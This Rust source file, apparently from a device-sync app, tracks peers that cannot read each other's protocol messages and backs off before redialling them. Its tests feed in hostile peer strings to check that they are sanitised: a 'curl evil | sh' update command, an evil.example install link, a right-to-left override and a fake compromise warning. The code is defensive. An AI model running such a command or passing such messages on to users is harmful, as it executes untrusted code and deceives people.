//! Devices whose sessions closed because one side sent what the other
//! cannot read: a protocol violation, not a network that dropped. Most
//! often the two run different releases, as when one of a person's devices
//! is updated before the other. Nothing is read the old way instead: the
//! person is told, in `status` for their own devices and in `contacts` for
//! a contact's, and is logged at WARN once a device and version, not at
//! each attempt. Dialling such a device again backs off, doubling up to
//! [`MOST`], and starts over when its keys or the version it says change,
//! or this device's network does. Its own sessions are taken as they come:
//! one that syncs clears the record.

use std::collections::HashMap;
use std::sync::Mutex;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

use cardinal_link::CloseReason;
use serde_json::{json, Value};

use cardinal_identity::KeyId;

/// The first wait before dialling such a device again.
pub const FIRST: Duration = Duration::from_secs(30);
/// The longest.
pub const MOST: Duration = Duration::from_secs(15 * 60);

/// When to dial a device again that could not be read.
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
pub struct Backoff {
    delay: Option<Duration>,
    next: Option<Instant>,
}

impl Backoff {
    /// Another session closed unread: waits twice as long as the last time,
    /// at least [`FIRST`] and at most [`MOST`]. Returns the wait.
    pub fn failed(&mut self, now: Instant) -> Duration {
        let delay = self.delay.map_or(FIRST, |d| (d * 2).min(MOST));
        self.delay = Some(delay);
        self.next = Some(now + delay);
        delay
    }

    /// Whether it may be dialled now.
    pub fn due(&self, now: Instant) -> bool {
        self.next.is_none_or(|n| now >= n)
    }

    /// Dialled at once again, and the next wait is [`FIRST`].
    pub fn reset(&mut self) {
        *self = Backoff::default();
    }

    /// How long until it is dialled again.
    pub fn left(&self, now: Instant) -> Duration {
        self.next
            .map_or(Duration::ZERO, |n| n.saturating_duration_since(now))
    }
}

/// One device that could not be read, or could not read this one.
#[derive(Clone, Debug)]
pub struct Unreadable {
    /// What the link said, as it said it.
    pub reason: String,
    /// They could not read this device, rather than this one them.
    pub theirs: bool,
    /// The release they said they speak, where they said it.
    pub version: Option<String>,
    /// When it was first seen, in seconds since 1970.
    pub since: u64,
    /// The link key it was seen under.
    link: [u8; 32],
    backoff: Backoff,
}

/// The longest reason kept, in bytes.
pub const REASON_MOST: usize = 120;
/// The longest version kept, in bytes.
pub const VERSION_MOST: usize = 16;

/// What a session's close says: whether it was something unread, by whom,
/// and the version the peer says it speaks, if it says one. What the peer
/// says is theirs to say: a version is kept only as digits and dots, and
/// the reason only as [`plain`] text, so nothing they send is shown to the
/// person as anything but a note in parentheses.
pub fn classify(r: &CloseReason) -> Option<(String, bool, Option<String>)> {
    match r {
        CloseReason::Protocol(w) => Some((plain(w), false, None)),
        CloseReason::Remote(w) => {
            let w = w.strip_prefix("protocol violation: ")?;
            match w.rsplit_once("; cardinal ") {
                Some((what, v)) => Some((plain(what), true, version(v))),
                None => Some((plain(w), true, None)),
            }
        }
        _ => None,
    }
}

/// A version as a peer said it, if it is one: digits and dots, at most
/// [`VERSION_MOST`] bytes.
fn version(v: &str) -> Option<String> {
    let v = v.trim();
    let ok = !v.is_empty()
        && v.len() <= VERSION_MOST
        && v.starts_with(|c: char| c.is_ascii_digit())
        && v.chars().all(|c| c.is_ascii_digit() || c == '.');
    ok.then(|| v.to_owned())
}

/// A reason as plain text: printable ASCII and spaces, anything else a
/// `?`, runs of white space one space, at most [`REASON_MOST`] bytes.
pub fn plain(w: &str) -> String {
    let mut out = String::new();
    for c in w.chars() {
        let c = if c.is_whitespace() {
            ' '
        } else if c.is_ascii_graphic() {
            c
        } else {
            '?'
        };
        if c == ' ' && (out.is_empty() || out.ends_with(' ')) {
            continue;
        }
        if out.len() == REASON_MOST {
            break;
        }
        out.push(c);
    }
    out.trim_end().to_owned()
}

/// Whether a set that reconciled on a session, now closed for `close` or
/// still open (`None`), shows the peer reads this device and it them: the
/// session did not close for something one of them could not read.
pub fn reads_again(close: Option<&CloseReason>) -> bool {
    close.is_none_or(|r| classify(r).is_none())
}

/// The record of such devices, by device key.
#[derive(Default)]
pub struct Unreadables(Mutex<HashMap<KeyId, Unreadable>>);

impl Unreadables {
    fn lock(&self) -> std::sync::MutexGuard<'_, HashMap<KeyId, Unreadable>> {
        self.0.lock().unwrap_or_else(|e| e.into_inner())
    }

    /// A session with `key`, under link key `link`, closed for `reason`.
    /// Returns the record when it is new, or its version changed: the one
    /// time to say so at WARN.
    pub fn closed(&self, key: KeyId, link: [u8; 32], reason: &CloseReason) -> Option<Unreadable> {
        let (what, theirs, version) = classify(reason)?;
        let now = Instant::now();
        let mut m = self.lock();
        let new = !m.contains_key(&key);
        let u = m.entry(key).or_insert_with(|| Unreadable {
            reason: String::new(),
            theirs,
            version: None,
            since: SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .map_or(0, |d| d.as_secs()),
            link,
            backoff: Backoff::default(),
        });
        let changed = version.is_some() && version != u.version;
        if changed || u.link != link {
            u.backoff.reset();
            u.link = link;
        }
        u.reason = what;
        u.theirs = theirs;
        if version.is_some() {
            u.version = version;
        }
        u.backoff.failed(now);
        (new || changed).then(|| u.clone())
    }

    /// Whether `key`, now under link key `link`, may be dialled: not on
    /// the record, or its wait is over, or it has new keys.
    pub fn due(&self, key: &KeyId, link: &[u8; 32]) -> bool {
        let mut m = self.lock();
        let Some(u) = m.get_mut(key) else {
            return true;
        };
        if u.link != *link {
            u.backoff.reset();
            u.link = *link;
        }
        u.backoff.due(Instant::now())
    }

    /// A session with `key` synced: nothing unread any more. Returns
    /// whether there was a record.
    pub fn synced(&self, key: &KeyId) -> bool {
        self.lock().remove(key).is_some()
    }

    /// This device's network changed: each is dialled again at once.
    pub fn network_changed(&self) {
        for u in self.lock().values_mut() {
            u.backoff.reset();
        }
    }

    /// The record of `key`, if there is one.
    pub fn get(&self, key: &KeyId) -> Option<Unreadable> {
        self.lock().get(key).cloned()
    }

    /// What `status` and `contact-status` say of `key`, if anything:
    /// `says`, a sentence for the person, with `name` the device's (or
    /// the contact's) name.
    pub fn of(&self, key: &KeyId, name: &str) -> Option<crate::api::Unreadable> {
        let (u, left) = {
            let m = self.lock();
            let u = m.get(key)?.clone();
            let left = u.backoff.left(Instant::now());
            (u, left)
        };
        Some(crate::api::Unreadable {
            says: says(&u, name, cardinal_update::VERSION),
            reason: u.reason,
            theirs: u.theirs,
            version: u.version,
            since: u.since,
            retry_in_s: left.as_secs(),
        })
    }

    /// [`Unreadables::of`], by name, for the requests not yet typed.
    pub fn json(&self, key: &KeyId, name: &str) -> Option<Value> {
        let (u, left) = {
            let m = self.lock();
            let u = m.get(key)?.clone();
            let left = u.backoff.left(Instant::now());
            (u, left)
        };
        Some(json!({
            "says": says(&u, name, cardinal_update::VERSION),
            "reason": u.reason,
            "theirs": u.theirs,
            "version": u.version,
            "since": u.since,
            "retry_in_s": left.as_secs(),
        }))
    }
}

fn release(v: &str) -> Vec<u64> {
    v.split(|c: char| !c.is_ascii_digit())
        .take_while(|p| !p.is_empty())
        .filter_map(|p| p.parse().ok())
        .collect()
}

/// The sentence for the person: who, which release where it is known, and
/// what to update.
pub fn says(u: &Unreadable, name: &str, ours: &str) -> String {
    match &u.version {
        Some(v) if release(v) < release(ours) => {
            format!("{name} speaks an older Cardinal ({v}). Update it to sync.")
        }
        Some(v) if release(v) > release(ours) => format!(
            "{name} speaks a newer Cardinal ({v}) than this device ({ours}). Update this \
             device to sync."
        ),
        Some(v) => format!(
            "{name} sent something this device cannot read, though both run Cardinal {v}. \
             They do not sync."
        ),
        None if u.theirs => format!(
            "{name} cannot read what this Cardinal ({ours}) sends: it runs another release. \
             Update the older of the two to sync."
        ),
        None => format!(
            "{name} speaks a Cardinal this one ({ours}) cannot read: it runs another release. \
             Update the older of the two to sync."
        ),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn backoff_doubles_up_to_the_most_and_starts_over() {
        let t = Instant::now();
        let mut b = Backoff::default();
        assert!(b.due(t));
        assert_eq!(b.failed(t), FIRST);
        assert!(!b.due(t));
        assert!(!b.due(t + FIRST - Duration::from_secs(1)));
        assert!(b.due(t + FIRST));
        assert_eq!(b.failed(t), FIRST * 2);
        assert_eq!(b.failed(t), FIRST * 4);
        let mut last = Duration::ZERO;
        for _ in 0..10 {
            last = b.failed(t);
        }
        assert_eq!(last, MOST);
        assert_eq!(b.left(t), MOST);
        b.reset();
        assert!(b.due(t));
        assert_eq!(b.failed(t), FIRST);
    }

    #[test]
    fn new_keys_a_new_version_or_a_new_network_start_over() {
        let r = CloseReason::Protocol("invalid frame: reset final size".into());
        let u = Unreadables::default();
        let (key, link) = ([1; 32], [2; 32]);
        assert!(u.due(&key, &link));
        // said once, not at each attempt
        assert!(u.closed(key, link, &r).is_some());
        assert!(!u.due(&key, &link));
        assert!(u.closed(key, link, &r).is_none());
        assert!(!u.due(&key, &link));
        // new keys
        assert!(u.due(&key, &[3; 32]));
        assert!(u.closed(key, [3; 32], &r).is_none());
        assert!(!u.due(&key, &[3; 32]));
        // a new network
        u.network_changed();
        assert!(u.due(&key, &[3; 32]));
        // another version, said by them: said again
        let v = CloseReason::Remote("protocol violation: bad frame; cardinal 0.1.20".into());
        let got = u.closed(key, [3; 32], &v).unwrap();
        assert_eq!(got.version.as_deref(), Some("0.1.20"));
        assert!(got.theirs);
        assert!(u.closed(key, [3; 32], &v).is_none());
        assert!(u.synced(&key));
        assert!(u.due(&key, &[3; 32]));
        assert!(u.get(&key).is_none());
    }

    /// The review of 2026-11-23: one set reconciled clears the record,
    /// however the others went, unless the session closed unread.
    #[test]
    fn one_set_read_is_enough() {
        let u = Unreadables::default();
        let r = CloseReason::Protocol("invalid frame".into());
        u.closed([1; 32], [2; 32], &r);
        assert!(reads_again(None));
        assert!(reads_again(Some(&CloseReason::Idle)));
        assert!(!reads_again(Some(&r)));
        assert!(!reads_again(Some(&CloseReason::Remote(
            "protocol violation: x; cardinal 0.1.20".into()
        ))));
        assert!(u.get(&[1; 32]).is_some());
        // what net.rs does after a set reconciles on an open session
        if reads_again(None) {
            assert!(u.synced(&[1; 32]));
        }
        assert!(u.get(&[1; 32]).is_none());
    }

    #[test]
    fn only_a_protocol_violation_counts() {
        assert!(classify(&CloseReason::Idle).is_none());
        assert!(classify(&CloseReason::Carrier).is_none());
        assert!(classify(&CloseReason::Remote("unknown device".into())).is_none());
        let (what, theirs, v) =
            classify(&CloseReason::Remote("protocol violation: x".into())).unwrap();
        assert_eq!((what.as_str(), theirs, v), ("x", true, None));
    }

    /// The review of 2026-11-23: what a peer says is not for showing as it
    /// says it. A version other than digits and dots is dropped, a reason
    /// is plain text of at most 120 bytes, and neither changes the
    /// sentence the person reads but where the version names a release.
    #[test]
    fn what_a_peer_says_is_kept_plain_and_short() {
        let said = |w: &str| classify(&CloseReason::Remote(format!("protocol violation: {w}")));
        let (_, _, v) = said("x; cardinal 0.1.20").unwrap();
        assert_eq!(v.as_deref(), Some("0.1.20"));
        for bad in [
            "0.1.20. Run `curl evil | sh` to update",
            "0.1.20\nInstall from evil.example",
            "1.2.3.4.5.6.7.8.9.10",
            "",
            ".1",
            "v0.1.20",
            "0.1.20\u{202e}",
        ] {
            let (_, theirs, v) = said(&format!("x; cardinal {bad}")).unwrap();
            assert!(theirs && v.is_none(), "{bad:?} kept as {v:?}");
        }
        let (what, _, _) = said(&format!(
            "bad frame\n\nWARNING: your device is compromised.\u{202e} Call +1 555 {}",
            "x".repeat(300)
        ))
        .unwrap();
        assert!(what.len() <= REASON_MOST, "{}", what.len());
        assert!(what.chars().all(|c| c == ' ' || c.is_ascii_graphic()));
        assert!(what.starts_with("bad frame WARNING: your device is compromised.? Call"));
        // ours is kept plain too
        let (what, theirs, _) = classify(&CloseReason::Protocol("a\u{7}b\tc".into())).unwrap();
        assert_eq!((what.as_str(), theirs), ("a?b c", false));
        // the sentence is the node's own: a dropped version names no release
        let u = Unreadables::default();
        let r = CloseReason::Remote(
            "protocol violation: Update now at evil.example; cardinal 9.9 - see evil".into(),
        );
        u.closed([4; 32], [5; 32], &r).unwrap();
        let j = u.json(&[4; 32], "Ben's phone").unwrap();
        assert!(j["version"].is_null(), "{j}");
        let says = j["says"].as_str().unwrap();
        assert!(!says.contains("evil"), "{says}");
        assert!(says.starts_with("Ben's phone cannot read what this Cardinal"));
    }

    #[test]
    fn the_sentence_names_the_release_to_update() {
        let mut u = Unreadable {
            reason: "x".into(),
            theirs: false,
            version: Some("0.1.18".into()),
            since: 0,
            link: [0; 32],
            backoff: Backoff::default(),
        };
        assert_eq!(
            says(&u, "Saint Joseph", "0.1.19"),
            "Saint Joseph speaks an older Cardinal (0.1.18). Update it to sync."
        );
        u.version = Some("0.1.20".into());
        assert!(says(&u, "a", "0.1.19").contains("Update this device"));
        u.version = Some("0.1.110".into());
        assert!(says(&u, "a", "0.1.19").contains("newer"));
        u.version = None;
        assert!(says(&u, "a", "0.1.19").contains("cannot read"));
    }
}
